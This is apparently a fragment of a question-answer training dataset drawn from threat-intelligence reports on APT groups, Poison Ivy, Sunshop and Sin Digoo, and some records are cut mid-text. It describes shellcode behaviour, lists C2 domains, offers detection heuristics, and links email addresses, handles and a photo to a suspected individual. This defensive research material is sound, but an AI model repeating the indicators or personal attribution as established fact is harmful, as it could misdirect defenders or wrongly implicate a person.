    "output": "The shellcode contained a date check to limit the operational window of the exploit. This means the shellcode would stop working after a specific date, which in the Telenor case was February 16th, 2013. In more recent variations, the timeout date was set to May 21st, 2013. If the exploit was triggered before the timeout date, the shellcode performed two actions: it posted system information (such as machine name, timezone, ID, and running processes) to a PHP script on the website random123.site11.com, and it downloaded and executed an executable from remote sites like softmini.net, www.infocardiology.biz, www.getmedia.us, www.technopenta.org, and autowidge.org. This mechanism allowed the attackers to control the lifecycle of their malicious activities and potentially evade detection after a certain period.",

    "instruction": "Big Headline: Section 3: Incident Inter-Relationships\nThere are a number of domains and IP addresses that have been tied to the previously mentioned incidents. Toward the beginning of the report it was stated that we believed all of these incidents to be related. As has already been seen, there are some similarities across the incidents, such as same victim organization, similar beaconing data blocks, and infection believed to be from malicious email attachments.  However, the strongest evidence for their relationship is the fact that related domains and IPs are used for C&Cs across these incidents.\nThe following Figure 3 - Link-Graph of \"1.php\" Incident Inter-Relationship provides this illustration with only a small snippet of information from these incidents:\nBig Headline: 3.1 Possible Relationship to Other APT Incidents\nPast experience with APT-style incidents show that hostnames may be used to identify the C&C for particular victims of interest.  For example, in bakerhughes.thruthere.net9  was a C&C used against Baker Hughes in the disclosed Night Dragon10  attacks. There have been a number of interesting hostnames used with \"1.php\" C&C domains that may indicate other potential victims. These hostnames potentially identify victims within the US Government (USG), Defense Industrial Base (DIB), and Geospatial industry. The above link-graph provides one example of such an entity that has information about its attacks already disclosed in the open-source (QinetiQ).\n\"QINETIQ\" or \"QNAO\" (QinetiQ North America Operations) for example, was an HBGary customer. HBGary supported QinetiQ in detection and analysis of on-going targeted attacks against them.  Following the Anonymous compromise and leakage of HBGary information, there is significant information in the public domain regarding the attacks against QinetiQ.  One such example is HBGary's Incident Response Technical Report Supplement for QinetiQ11 . Page 8 of that report, in the \"History of the strain\" section states:\nHBGary has code-named this threat group as \"Soysauce\". This group      is also known as \"Comment Crew\" by some, and also as \"GIF89a\" by      some. The choice of codename is completely arbitrary in this context      and is simply meant to identify a group of Chinese hackers who have      a consistent agenda to target the defense industrial complex.\nThe name \"Comment Crew\" and \"GIF89a\" has been used by researchers because of the behavior of this group to enclose C&C commands within comments on HTML pages or hidden within image files, a technique known as steganography. These indicators have not been witnessed in the attacks previously listed in this report.\nBeyond a likely QinetiQ attack relation, there are a number of other hostnames that indicate potential attack targets of the \"1.php\" Group. Disclosure of other possible victim names is intentionally omitted from this report.\n9. http://hbgary.anonleaks.ch/greg_hbgary_com/2505.html\n10. http://www.mcafee.com/in/resources/white-papers/wp-global-energy-cyberattacks-night-dragon.pdf\n11. http://publicintelligence.info/HBGary-QinetiQ.pdf\n\"   There have been a number of interesting hostnames used with \"1.php\" C&C domains that may include other potential victims. \"\n-Zscaler ThreatLabZ\nMedium Headline: 4.1 Conduct logging and analytics within your environment\nThis report shows an evolution of the beaconing behavior from the \"1.php\" Group.  Relying solely on existing signatures of known threats would not have triggered detections. By identifying transactions that are anomalous, it is possible to detect previous or recurring incidents, such as those identified above.  Some of the anomalies, which led to the findings in this report, include:\n\u2022 HTTP version 1.0 requests with version 1.1 responses\n\u2022 Numerous transactions to an unknown / uncategorized domain\n\u2013 Some of these transactions were to No-IP dynamic DNS domains\n\u2022 Blocking or heavily monitoring the communication to dynamic    DNS domains is recommended\n\u2013 Some of these domains were parked\n\u2013 Transactions occur during non-standard times (nights / weekends)\n\u2013 Some transactions (in particular the GET beacons) had a larger    request size than response size\n\u2022 Microsoft IE 6 user-agent (UA) string usage in an environment that does not typically use this UA\nMedium Headline: 4.2 Correlate with other sources\nBy leveraging data sources such as passive DNS, domain registration information, other open-source reports, and other research - it is possible to derive information about probable domains and infrastructure used, in other attacks by the same group of attackers.  In some cases, this information may provide indicators as to the targets or purpose of the attacks.  It should also be noted that making too many assumptions or believing unverified indicators as fact can lead to misleading information. Anyone can set a hostname for a C&C to be \"QINETIQ\" for example. However, by correlating these domains with a group that has been identified as being involved in APT attacks, provides a stronger indication into their possible target.\nMedium Headline: 4.3 APTs are not always that 'Advanced'\nThe above incident reports document (spear-) phishing with a malicious PDF attachment, or link to a binary executable with a Poison Ivy RAT payload. While the exploitation used in some of the crafted PDF attachments may be considered advanced, for the most part the attack is one of social-engineering. This is nothing new and something that other fraudsters / criminals have been leveraging for many years. RSA recently wrapped up their APT summit and their first finding concluded that the \"attack vector [is] shifting from technology to people\". 12\nQuestion: What techniques can be employed to detect anomalous transactions that might indicate an APT attack, as demonstrated by the '1.php' Group? How can these techniques help in identifying previous or recurring incidents?",
    "output": "Answer: To detect anomalous transactions that might indicate an APT attack, several techniques can be employed. These include identifying HTTP version 1.0 requests with version 1.1 responses, numerous transactions to unknown or uncategorized domains (including No-IP dynamic DNS domains), transactions occurring during non-standard times (nights/weekends), and the use of outdated user-agent strings like Microsoft IE 6 in environments where it is not typically used. Additionally, transactions with a larger request size than response size, especially for GET beacons, can be indicative of anomalous activity. These techniques help in identifying previous or recurring incidents by highlighting patterns that deviate from normal behavior, allowing for the detection of threats that might not be caught by existing signatures of known threats.",

    "instruction": "Big Headline: Overview\nWe collected 110 unique binaries, which were detected as Trojan.APT.9002, Trojan.APT.PoisonIvy, Trojan.APT.Gh0st, Trojan.APT.Kaba, and Trojan. APT.Briba. Sixty-five of these binaries were packaged with two unique manifest resources, and 47 were signed with six different digital certificates. The binaries connected to 54 unique fully qualified domains.\nWe identified these samples by searching binaries packaged with the two unique portable executable (PE) resources that we had previously identified. We believe that these PE resources are unique to Sunshop and the 10 other linked campaigns.\nWe also searched for samples signed with the six different digital certificates that were used to sign binaries connected to these campaigns. These certificates were not unique to these campaigns and have been used to sign unrelated malware. Therefore, we cross-checked samples signed with any of these certificates to ensure that they were, in fact, related to the 10 campaigns we identified as linked to Sunshop.\nAs we identified related campaigns that leveraged the unique PE resources or digital certificates, we then pivoted off the CnC infrastructure to identify additional samples. We cross-checked samples identified through this process to ensure that they did indeed share the code elements that we previously identified as unique to Sunshop and its associated campaigns.\nWe searched our internal repositories, including the FireEye high performance cluster and other wellknown external repositories. We primarily relied on running active searches with YARA signatures designed to identify samples, with either the PE resources or digital certificates. We also compared the import tables used in each sample to establish additional links between the 10 different campaigns linked to Sunshop.\nAll of this research led us to the above-mentioned 110 binaries. Figure 2 plots the samples in a Maltego chart.\nWe continued our analysis by adding the following additional data points to our graph.\n\u2022 Two portable executable (PE) resources used by 64 samples in our collection\n\u2022 Six different digital certificates used by 47 samples in our collections\n\u2022 Hashes of the different import tables used by the binaries in our graph\nThese additional data points linked the 11 different clusters of activity and revealed what we believe to be a shared development logistics infrastructure.\nFigure 3 illustrates the overlaps and connections that exist between what initially appeared to be 11 independent campaigns. This chart shows how the additional data points of the shared PE\nresources, commonly used digital certificates, and identical import tables can link these different campaigns together.\nSmall Headline: MD5      010e5a583d74850cdc0655f22c7a9003\nSHA256\n46b966331d883d642293f4b1faa55f4c8c3 0b4238df8f121278a3752609a2cef\nThe full text of the PE resource manifest is as follows:\nWe found 20 samples using the DTL manifest. These binaries were detected as Trojan.APT.9002. We observed these 20 samples used in five of the 11 different campaigns discussed below.\nThe only difference between these manifest resources is the indentation of the <security> elements. Lines 10 through 13 in Figure 6 detail this difference.\nThis slight difference results in a different hash for the resource. The similarity between these two manifests would likely go unnoticed by automated analysis. Also, the XML is improperly formatted, hinting that it was formatted manually. As an experiment, we used NSIS v2.34 to create our\nown simple installer and found that the XML in the manifest had no new-line or tab characters.\nMedium Headline: Import tables\nWe utilized a simple technique to identify similarities in import tables between the 110 different samples we analyzed during our analysis. We aggregated the import calls found in each sample and used this as a unique fingerprint. We then used these fingerprints to cluster similar samples together.\nThe Python code in Figure 6 relies on the module pefile and can be used to dump all the import calls used in a specific binary. The output can then be easily hashed.\npe = pefile.PE(file)    for entry in pe.DIRECTORY_ENTRY_IMPORT:       for imp in entry.imports:          if imp.name != None:             print entry.dll, imp.name, hex(imp.address)          else:\nprint entry.dll, hex(imp.address)\nFigure 7. Python code to dump all import calls used in a specific binary\nWe found 33 unique import tables used for the 110 different samples we collected during our research. The most common import table seen had a MD5 hash of\n3a7faeac22e6ab5c3c28a2b617901b51 and appeared in 38 different binaries. This particular import table appeared in both Trojan. APT.9002 and Trojan. APT.PoisonIvy binaries. It was used in eight of the 11 different clusters of activity we studied during this analysis. In addition to the identical import tables, these samples have the same code base, differing in the unpacking routine for the actual payload, indicating that they are general-purpose launchers.\nUpon execution, the malware samples with the import table hash of 3a7faeac22e6ab5c3c28a2b617901b51 called back to these domains and IP addresses:\n\u2022 ieee.boeing-job[.]com\n\u2022 lol.dns-lookup[.]us\n\u2022 twn.ftpmicrosoft[.]com\n\u2022 127.0.0.1\n\u2022 piping.no-ip[.]org\n\u2022 wv.downmicrisoft[.]com\n\u2022 mx.downmicrisoft[.]com\n\u2022 update1.mysq1[.]net\n\u2022 ru.pad62[.]com\n\u2022 phpweb.zapto[.]org\n\u2022 asp.homesvr.linkpc[.]net\n\u2022 dns.homesvr[.]tk\n\u2022 ssl.homesvr[.]tk\nThe second most common import table had a MD5 hash of f6d9eda2b4ab23b1f2be49e1a4f9a1f7 and appeared in 12 different samples.

According to the (<http://www.occ.treas.gov/news-issuances/alerts/2011/alert-2011-4.html>)US-CERT EWIN-11-077 bulletin, a number of command-and-control (C2) hostnames used by RegSubs-Dat shared three different IP addresses at different points in time, with one of the hostnames known to be part of the RSA breach. This C2 hostname was used in a piece of malware known as \"Murcy\", which was detailed in \"(<http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf>)Command and Control in the Fifth Domain,\" a 2012 report by Command Five Pty Ltd.\nAll three IP addresses belong to the China Beijing Province Network (AS4808). Although the RegSubsDat and Murcy C2s shared these IPs a few months apart, the fact that three IP different addresses at the same ISP overlapped in a short time frame seems to indicate shared infrastructure used by both the RSA breach actors and other actors using the RegSubsDat malware. AS4808 is known for many other connections to malware and is considered by some to be a hotbed of espionage C2s, especially the 123.120.96.0/19, 114.248.80.0/20 and 114.248.96.0/20 subnets. These subnets have been seen in DNS records for hundreds of C2 hostnames for dozens of custom malware families, either known for or\nsuspected in espionage activity.\nMedium Headline: Tracking Tawnya\nThe same type of open-source intelligence can be used to gather information about the jeno_1980@hotmail.com actor. One domain registered by jeno_1980@hotmail.com is \"socialup.net\". This site describes a \"like exchange,\" which is a service that Internet marketers can use to promote a story on social media sites like Digg or Reddit.\nThis type of service falls under the category of \"blackhat SEO,\" a term for a variety of techniques for manipulating search engines and social media sites for marketing purposes. These methods are considered \"blackhat\" because they usually lead to a site or user being banned from the search engine or social media sites if the manipulation is discovered.\nThe socialup.net website has been repeatedly promoted on blackhat SEO message boards by various personas, including one named \"Tawnya\".\nOnce a user signs up with socialup.net, they can earn virtual \"coins.\" The coins can be used to promote the user's websites or social media posts, either by viewing ads or liking other users' stories and links. A user can also buy coins from the owner of socialup.net using PayPal.\nAs part of the PayPal transaction, the potential customer can see the payee email address.

This domain was registered in 2004 using the jeno_1980@hotmail.com email address and \"Sin Digoo\" location, but the nickname \"xxgchappy\" is also shown in the registrant contact data.\nAnother domain registered in 2004 using the \"Sin Digoo\" location was \"1stsale.net\", registered to a \"john twk\" with the email address xxgchap-py@vip.sina.com.\nThere is a profile on a Chinese programmers' forum for an \"xxgchappy\" user who has posted two different email addresses in different messages on the site. These addresses are xxgchappy@vip.sina.com and @sina.com.cn (address redacted). The user's name is listed on the forum's profile page for \"xxgchappy\" and contains the initials ZD.\nSeveral clues on the Internet point to xxgchappy, or ZD, having a working knowledge of computer programming. The use of the programmers' forum, along with postings to that site, indicates he is interested in code related to hooking Windows API functions, a common technique used in malware. Additionally, both xxgchappy@vip.sina.com and king_public@hotmail.com were the listed email addresses for users of the \"rootkit.com\" site, revealed when that site's database was leaked in 2011.\nA \"rootkit\" is a program used for hiding traces of malware on a system, and rootkit.com was a forum for discussing the latest rootkit technolo-\ngies. However, simply having an account on rootkit.com does not imply one is using rootkits offensively \u2014 many anti-malware researchers were also members of the site.

Even more interesting is the 123.120.127.153 IP address the king-z account used to log in. This IP is located inside one of the AS4808 netblocks famous for espionage activity. In fact, it is remarkably close to 123.120.127.159, an IP used by Enfal C2 v2.windowsaupdate.net (one of the \"Tawnya Grilth\" domains) on September 27, 2010. The last account activity for king-z as shown in the rootkit.com database is September 9, 2010. This data strongly suggests that king_public@hotmail.com is not just a stolen account used to register a domain, but that the user is involved in the espionage network in some manner.\nThe password used by xxgchappy@vip.sina.com does not appear elsewhere in the leaked rootkit.com database; however, another leaked database may provide additional clues surrounding the xxgchappy personality.\nThe @sina.com.cn (address redacted) email address associated with the user xxgchappy can be found inside an archive posted to the \"hackchina.com\" website.\nxxgchappy # 2710 # @sina.com.cn\nFigure 15. xxgchappy reference from the hackchina.com website.\nThe archive contains a denial-of-service attack tool called \"lankiller\".  Inside the lankiller binary is the following comment:\nDesigned for lyh by xxgc-happy   2002.3.8\nFigure 16. Reference to xxgc-happy in the lankiller tool.\nAlso included in the lankiller archive is a README file that describes the use of the tool. It asks the user to email the author at either @sina.com.cn or happy@sohu.com.cn.\nThere is a profile for \"happy\" on a Chinese video site showing a possible photo of the user. The photo is of a man who appears to be in his early twenties and of Asian descent.\nMedium Headline: Conclusion\nThe Sin Digoo activity is only a limited view into a very large amount of espionage-by-malware that is happening in the world. The Enfal, RegSubsDat, and Murcy malware families possess dozens of defunct and active C2s, and these three trojans are only a tiny subset of the malware families the Dell SecureWorks CTU research team knows to be involved in espionage activity. Collaboration between government, espionage malware victims, and the computer security industry must improve to better defend against this undercurrent of activity that threatens to undermine an already weakened economy in countries around the world.\n\nHow did the investigation into the Sin Digoo affair reveal connections between the malware used and the RSA breach in 2011? Explain the significance of the shared IP addresses and the role of AS4808.",
    "output": "A: The investigation into the Sin Digoo affair revealed connections between the malware used and the RSA breach through shared command-and-control (C2) hostnames and IP addresses. According to the US-CERT EWIN-11-077 bulletin, a number of C2 hostnames used by RegSubs-Dat shared three different IP addresses at different points in time, with one of the hostnames known to be part of the RSA breach. This C2 hostname was used in a piece of malware known as 'Murcy'. All three IP addresses belonged to the China Beijing Province Network (AS4808), which is known for its connections to malware and is considered a hotbed of espionage C2s. The overlap of these IP addresses in a short time frame suggests shared infrastructure used by both the RSA breach actors and other actors using the RegSubsDat malware. The subnets within AS4808 have been seen in DNS records for hundreds of C2 hostnames for dozens of custom malware families, either known for or suspected in espionage activity.",

But possible explanations include PIVY's easy-to-use features and the relative anonymity that an off-the-shelf RAT provides for attackers.\nCompared to other RATs, PIVY is very easy to operate. Its graphical user interface (GUI) makes building new servers and controlling infected targets simple. Attackers can point and click their way through a compromised network and exfiltrate data.\nCommodity RATs also complicate efforts by security professionals to correlate a threat actor's activity over time\u2014attackers can hide in the sea of malicious activity that also uses Poison Ivy-based malware.\nBy exposing the role of PIVY and other commodity RATs in APT campaigns we hope to complicate attackers' ability to hide behind these off-the-shelf tools\u2014and perhaps force them away from using these RATs.\nIn this report, we have provided several techniques that network defenders can use to not only identify a PIVY infection, but also classify and correlate detected infections to previously observed APT activity.\nIn the process of building their PIVY servers, attackers leave a number of potentially useful clues, such as:\n\u2022 The domains and IPs used for CnC\n\u2022 The chosen PIVY process mutex\n\u2022 The chosen PIVY password\n\u2022 Launcher code used in the droppers\n\u2022 Timeline of activity\n\u2022 Targets of attack\nTogether, all of these data points can help effectively identify and correlate APT activity that uses the Poison Ivy RAT.\nBig Headline: About FireEye\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye platform provides real-time, dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors, including Web, email, and files and across the different stages of an attack life cycle.\nThe core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,000 customers across more than 40 countries, including over one-third of the Fortune 100.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  (<mailto:info%40FireEye.com>)info@fireeye.com  |  (<http://www.fireeye.com>)www.fireeye.com\n\nWhy might attackers behind the admin@338, menuPass, and th3bug campaigns prefer using Poison Ivy (PIVY) over other remote access tools?
